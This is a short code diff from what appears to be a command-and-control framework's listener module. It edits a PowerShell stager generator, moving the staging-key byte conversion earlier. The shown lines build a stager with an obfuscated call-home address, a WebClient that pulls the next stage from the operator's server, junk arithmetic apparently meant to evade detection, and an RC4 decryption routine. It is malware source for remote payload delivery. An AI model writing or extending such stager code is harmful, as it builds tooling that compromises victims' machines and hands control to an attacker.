@@ -277,6 +277,7 @@ class Listener:
             stager += (
                 f"$hom={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
             )
+            stager += f"$Kk=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
             stager += "$wc=New-Object System.Net.WebClient;"
             stager += "$f1=1 + 2 * 3;"
             if userAgent.lower() != "none":
@@ -323,7 +324,7 @@ class Listener:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
-            stager += f"$Kk=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            
             stager += f"$f2=$f1*4;"
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
